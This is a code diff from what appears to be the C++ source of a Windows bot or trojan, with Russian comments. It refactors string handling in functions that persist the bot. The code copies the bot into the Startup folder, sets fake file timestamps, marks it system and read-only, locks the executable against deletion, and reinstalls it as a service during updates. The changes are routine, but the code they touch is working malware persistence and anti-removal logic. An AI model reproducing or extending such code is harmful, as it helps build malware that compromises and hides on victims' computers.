@@ -405,7 +405,7 @@ namespace BOT
 	{
 		COREDBG("CORE", "Получена команда на удаление бота");
 
-		PCHAR FileName = NULL;
+		string FileName;
 
 		switch (BotData->ProcessType)
 		{
@@ -423,9 +423,7 @@ namespace BOT
 		}
 
 		COREDBG("CORE", "Удаляем файл %s", FileName);
-		DeleteBotFile(FileName);
-
-		STR::Free(FileName);
+		DeleteBotFile(FileName.t_str());
 
 		Cancel = true;
     }
@@ -661,20 +659,10 @@ DWORD BOT::GetBotExeNameHash()
 }
 //----------------------------------------------------------------------------
 
-PCHAR BOT::GetBotFullExeName()
+string BOT::GetBotFullExeName()
 {
 	//  Функция возвращает полное имя файла бота
-
-	PCHAR Path = STR::Alloc(MAX_PATH);
-
-	// Получаем путь к папке автозагрузки
-	pSHGetSpecialFolderPathA(NULL, Path, CSIDL_STARTUP, TRUE);
-
-    PCHAR Name = STR::New(3, Path, "\\", GetBotExeName());
-
-	STR::Free(Path);
-
-    return Name;
+	return GetSpecialFolderPathA(CSIDL_STARTUP, GetBotExeName());
 }
 //----------------------------------------------------------------------------
 
@@ -701,28 +689,26 @@ string BOT::GetServiceFullExeName()
 HANDLE BotFileHandle = NULL;
 HANDLE BotMapHandle = NULL;
 
+
 void BOT::Protect(PCHAR FileName)
 {
 	// Функция защищает ехе бота от удаления
-	bool FreeName = STR::IsEmpty(FileName);
+	string Name = FileName;
 
-	if (FreeName)
-		FileName = GetBotFullExeName();
+	if (Name.IsEmpty())
+		Name = GetBotFullExeName();
 
-	if (FileName == NULL)
+	if (Name.IsEmpty())
     	return;
 
 	// Открываем файл
-	BotFileHandle = (HANDLE)pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
+	BotFileHandle = (HANDLE)pCreateFileA(Name.t_str(), GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
 
 
 	if (BotFileHandle != INVALID_HANDLE_VALUE)
 	{
-		BotMapHandle = (HANDLE)pCreateFileMappingA(FileName, NULL, PAGE_READONLY, 0, 0, NULL );
+		BotMapHandle = (HANDLE)pCreateFileMappingA(Name.t_str(), NULL, PAGE_READONLY, 0, 0, NULL );
 	}
-
-	if (FreeName)
-		STR::Free(FileName);
 }
 
 //----------------------------------------------------------------------------
@@ -746,31 +732,25 @@ bool BOT::AddToAutoRun(PCHAR FileName)
 	if (!FileExistsA(FileName))
 		return false;
 
-	PCHAR BotFile = GetBotFullExeName();
+	string BotFile = GetBotFullExeName();
 
-	if (StrSame(FileName, BotFile, false, 0))
-	{
-		STR::Free(BotFile);
+	if (StrSame(FileName, BotFile.t_str(), false, 0))
 		return 0;
-    }
 
     // Снимаем системные атрибуты
-	pSetFileAttributesA(BotFile, FILE_ATTRIBUTE_NORMAL);
+	pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_NORMAL);
 
 	// Копируем файл
-	bool Result = (BOOL)pCopyFileA(FileName, BotFile, TRUE) == TRUE;
+	bool Result = (BOOL)pCopyFileA(FileName, BotFile.t_str(), TRUE) == TRUE;
 
 	// Устанавливаем дату файла
-	SetFakeFileDateTime(BotFile);
+	SetFakeFileDateTime(BotFile.t_str());
 
-	pSetFileAttributesA(BotFile, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
+	pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
 
 	// Удаляем исходный файл
 	if (Result)
 		pDeleteFileA(FileName);
-
-
-	STR::Free(BotFile);
 
 	return Result;
 }
@@ -880,18 +860,15 @@ bool BOT::IsService()
 //----------------------------------------------------
 string BOT::BotExeMD5()
 {
-	PCHAR FileName = BOT::GetBotFullExeName();
+	string FileName = BOT::GetBotFullExeName();
 
-	string Result = CalcFileMD5Hash2(FileName);
+	string Result = CalcFileMD5Hash2(FileName.t_str());
 
 	if (Result.IsEmpty())
 	{
 		Result.SetLength(32);
 		m_memset(Result.t_str(), '0', 32);
     }
-
-	STR::Free(FileName);
-
 	return Result;
 }
 
@@ -978,9 +955,7 @@ void BOT::Delete()
 
 void BOT::DeleteAutorunBot()
 {
-	char* fileName = BOT::GetBotFullExeName();
-	DeleteBotFile(fileName);
-	STR::Free(fileName);
+	DeleteBotFile(BOT::GetBotFullExeName().t_str());
 }
 //----------------------------------------------------------------------------
 
@@ -1036,18 +1011,17 @@ void BOT::SavePrefixToTemporaryFile()
 // Функция загружает префикс бота из временного файла
 // сохраняет его в рабочий файл и удаляет временный
 //----------------------------------------------------
-void BOT::SavePrefixFromTemporaryFile(bool IgnoreIfExists)
+void BOT::SavePrefixFromTemporaryFile()
 {
-	string PrefixFile = Bot->PrefixFileName();
-	if (IgnoreIfExists && File::IsExists(PrefixFile.t_str()))
-		return;
-
 	string TempName   = Bot->MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
-
-	string Prefix = LoadPrefixFromFile(TempName.t_str());
-	if (!Prefix.IsEmpty())
-		SavePrefixToFile(PrefixFile.t_str());
-	pDeleteFileA(TempName.t_str());
+	if (File::IsExists(TempName.t_str()))
+	{
+		string PrefixFile = Bot->PrefixFileName();
+		string Prefix = LoadPrefixFromFile(TempName.t_str());
+		if (!Prefix.IsEmpty())
+			SavePrefixToFile(PrefixFile.t_str());
+		pDeleteFileA(TempName.t_str());
+    }
 }
 
 
@@ -1075,9 +1049,9 @@ bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
 
     COREDBG("MakeUpdate", "Устанавливаем новую версию бота");
 
-	PCHAR BotFile = GetBotFullExeName();
+	string BotFile = GetBotFullExeName();
 
-	if (BotFile == NULL) return false;
+	if (BotFile.IsEmpty()) return false;
 
 	// При необходимости удалем сохранённые настройки
 	if (ResetSettings)
@@ -1087,16 +1061,16 @@ bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
 	bool ServiceInstalled = UninstallService();
 
     // Удаляем текущую версию бота
-	if (FileExistsA(BotFile))
+	if (FileExistsA(BotFile.t_str()))
 	{
 		COREDBG("MakeUpdate", "Удаляем старый файл");
 		Unprotect();
-		pSetFileAttributesA( BotFile, FILE_ATTRIBUTE_ARCHIVE );
+		pSetFileAttributesA( BotFile.t_str(), FILE_ATTRIBUTE_ARCHIVE );
 
 		// Удаляем старый файл
 		while (1)
 		{
-			if (pDeleteFileA(BotFile)) break;
+			if (pDeleteFileA(BotFile.t_str())) break;
             pSleep(100);
         }
 	}
@@ -1106,8 +1080,8 @@ bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
 		InstallService(FileName);
 
 	// Перемещаем файл
-	bool Result = pMoveFileExA(FileName, BotFile, MOVEFILE_REPLACE_EXISTING ) != 0;
-	pSetFileAttributesA(BotFile, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
+	bool Result = pMoveFileExA(FileName, BotFile.t_str(), MOVEFILE_REPLACE_EXISTING ) != 0;
+	pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
 
 
 	/* TODO :
@@ -1115,12 +1089,10 @@ bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
 		В дальнейшем необходимо  проработать методику "горячего" старта бота
 	*/
 
-	BOT::Protect(BotFile);
+	BOT::Protect(BotFile.t_str());
 
 //	RunFileA(BotPath);
 //	pExitProcess(1);
-
-	STR::Free(BotFile);
 
 	if (Result)
     	COREDBG("MakeUpdate", "Новый бот успешно установлен");
